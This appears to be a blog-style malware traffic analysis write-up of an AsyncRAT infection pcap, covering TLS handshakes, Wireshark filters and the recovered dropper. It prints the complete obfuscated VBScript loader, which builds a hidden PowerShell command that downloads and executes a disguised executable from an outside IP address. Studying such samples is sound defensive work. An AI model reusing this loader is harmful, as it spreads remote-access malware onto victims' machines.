---
layout: malwareA
title: "Welcome to Jekyll!"
date: 2025-04-06 12:26:40 +0530
categories: jekyll update
---

---

# INTRODUCTION

Often users while browsing may download some content without verification, a general idea of HTTPs it is secured but often attackers may use it for their advantage.

Site for reference: https://www.malware-traffic-analysis.net/2024/01/09/index.html

Given a pcap: https://www.malware-traffic-analysis.net/2024/01/09/2024-01-09-AsyncRAT-infection-traffic.pcap.zip

password: infected_20240109

### Acknowledgement of pcap file(and resources): 
#### Author: BRAD DUNCAN
#### Site: https://www.malware-traffic-analysis.net/

---

## THEORY

When browsing on net we often find sites with http and https, protocols with http are usually unsecured and it's default port is 80.

Whereas, https are secured and it's default port is 443.

SSL certs is what makes http as https by encrypting the traffic/data sent.

The certificate contains vital information about server's identity in general.

#### TLS handshake:
Transport layer security is initiated by TLS handshake between server and client. (clientHello - serverHello)

Here is "negotiation" between server and client:

=> Of what version TLS is going to be used,

=> Authenticating the identity of server by its TLS certificate.

=> which cipher suites going to used.

=> Generating session keys for encryption process.


#### Cipher suites:
It is a set of algorithm that specifies the details of what encryption method or keys are going to be used.

more on cipher suite: https://learn.microsoft.com/en-us/windows/win32/secauthn/cipher-suites-in-schannel

## WORKING ENVIRONMENT

To make task simpler and cleaner, we are going to use some filters:

basic

    tls.handshake.type == 1 or http.request and !(ssdp)

basic+

    tls.handshake.type == 1 or http.request and !(ssdp) or tcp.flags == 0x0002
    
basic+dns

    tls.handshake.type == 1 or http.request and !(ssdp) or tcp.flags == 0x0002 or dns

 tls.handshake.type == 1 (client Hello)
 
 http.request (for filtering requests made on http)
 
 tcp.flags == 0x0002 (SYN flag is set)
 
 dns (DNS resolution)

---

### INVESTIGATION
#### search for server by which victim got infected:

![Screenshot 2024-07-15 192758](https://github.com/user-attachments/assets/11dfdeff-5126-47d6-a04d-e7a65314f5e5)

no extension_server name found. It's fine sometimes SNI is opted out.


#### certificate:
    tls.handshake.type == 11 

checking issuer:

![Screenshot 2024-07-15 135812](https://github.com/user-attachments/assets/30c44bbc-b31a-4d4f-a949-8fe62ed866d6)

checking subject:

![Screenshot 2024-07-15 192904](https://github.com/user-attachments/assets/70e6a049-6771-4d00-a000-8bca656ef150)

> Here's the part: The certificate is issued by attacker themself, and it may be a bad indication (not neccessarily). 

applying filter basic for analyzing the packets sent:

![Screenshot 2024-07-15 193619](https://github.com/user-attachments/assets/354adcd8-043a-451f-b661-fe85947501de)

## ANALYZING THE FILES: 

Following HTTP stream on xlm.txt

![Screenshot 2024-07-15 194045](https://github.com/user-attachments/assets/c60994d2-cb15-4303-828e-769147e16389)


futher "text" was following:

```vb
    Dim LZeWX(88), OodjR, i

    ' Define each part based on the provided order
    LZeWX(0) = "[B"

    LZeWX(1) = "YT"

    LZeWX(2) = "e["

    LZeWX(3) = "]]"

    LZeWX(4) = ";$"

    LZeWX(5) = "A1"

    LZeWX(6) = "23"

    LZeWX(7) = "='"

    LZeWX(8) = "Ie"

    LZeWX(9) = "X("

    LZeWX(10) = "Ne"

    LZeWX(11) = "W-"

    LZeWX(12) = "OB"

    LZeWX(13) = "Je"

    LZeWX(14) = "CT"

    LZeWX(15) = " N"

    LZeWX(16) = "eT"

    LZeWX(17) = ".W"

    LZeWX(18) = "';"

    LZeWX(19) = "$B"

    LZeWX(20) = "45"

    LZeWX(21) = "6="

    LZeWX(22) = "'e"

    LZeWX(23) = "BC"

    LZeWX(24) = "LI"

    LZeWX(25) = "eN"

    LZeWX(26) = "T)"

    LZeWX(27) = ".D"

    LZeWX(28) = "OW"

    LZeWX(29) = "NL"

    LZeWX(30) = "O'"

    LZeWX(31) = ";["

    LZeWX(32) = "BY"

    LZeWX(33) = "Te"

    LZeWX(34) = "[]"

    LZeWX(35) = "];"

    LZeWX(36) = "$C"

    LZeWX(37) = "78"

    LZeWX(38) = "9="

    LZeWX(39) = "'V"

    LZeWX(40) = "AN"

    LZeWX(41) = "('"

    LZeWX(42) = "'h"

    LZeWX(43) = "tt"

    LZeWX(44) = "p:"

    LZeWX(45) = "//"

    LZeWX(46) = "45"

    LZeWX(47) = ".1"

    LZeWX(48) = "26"

    LZeWX(49) = ".2"

    LZeWX(50) = "09"

    LZeWX(51) = ".4"

    LZeWX(52) = ":2"

    LZeWX(53) = "22/m"

    LZeWX(54) = "dm"

    LZeWX(55) = ".j"

    LZeWX(56) = "pg"

    LZeWX(57) = "''"

    LZeWX(58) = ")'"

    LZeWX(59) = ".R"

    LZeWX(60) = "eP"

    LZeWX(61) = "LA"

    LZeWX(62) = "Ce"

    LZeWX(63) = "('"

    LZeWX(64) = "VA"

    LZeWX(65) = "N'"

    LZeWX(66) = ",'"

    LZeWX(67) = "AD"

    LZeWX(68) = "ST"

    LZeWX(69) = "RI"

    LZeWX(70) = "NG"

    LZeWX(71) = "')"

    LZeWX(72) = ";["

    LZeWX(73) = "BY"

    LZeWX(74) = "Te"

    LZeWX(75) = "[]"

    LZeWX(76) = "];"

    LZeWX(77) = "Ie"

    LZeWX(78) = "X("

    LZeWX(79) = "$A"

    LZeWX(80) = "12"

    LZeWX(81) = "3+"

    LZeWX(82) = "$B"

    LZeWX(83) = "45"

    LZeWX(84) = "6+"

    LZeWX(85) = "$C"

    LZeWX(86) = "78"

    LZeWX(87) = "9)"

    '' Combine the parts into one string
    OodjR = ""

    For i = 0 To 88 - 1
    OodjR = OodjR & LZeWX(i)
    Next

    ' Use the combinedParts in the shell execution
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True
    Set objShell = Nothing
```

using python script I removed all unnecessary parts

script.py
```python
input_file = 'input.txt'
output_file = 'output.txt'

with open(input_file, 'r') as fin, open(output_file, 'w') as fout:
    for line in fin:
        
        modified_line = line[11:].replace('"', '').rstrip().replace(' ', '')
        fout.write(modified_line)


print(f"Lines in {input_file} got cleaned and have been saved to {output_file}.")
```


![Screenshot 2024-07-15 212117](/assets/images/proof_malware.png)


Its powershell command to download http://45.126.209.4:222/mdm.jpg as a string

I wonder whats mdm.jpg ;)

![Screenshot 2024-07-15 212117](https://github.com/user-attachments/assets/01842bce-c841-4b97-8a33-a1a9f7744129)


content:image/jpeg

but header (magic numbers arent jpeg nor matching to any image extension)

header here is written in hex, converting it to ascii (4D 5A => M Z)

header mentioned here are MZ........

which is an executable! masquerading as image..........

 
#### RAT SIGNATURE:
Focusing on the malware itself,

it's hash comes out to be:
(SHA-256): 83babee77db36512c0eab8ea6b35e981aa4288a4095985d69b3841f8b684fe11  

![Screenshot 2024-07-17 004200](https://github.com/user-attachments/assets/35a569dc-bc84-4ca2-b228-85b038f6d2e3)


## WHAT MAY HAVE HAPPENED:
> My opinions:
The txt file don't contain any header name or magic numbers as such. When downloading Windows may go through file content or meta (my guess), text file is written as such to trigger powershell executing the command.

so mdm.jpeg is downloded but it's exe so,

This "mdm.exe" basically then would run.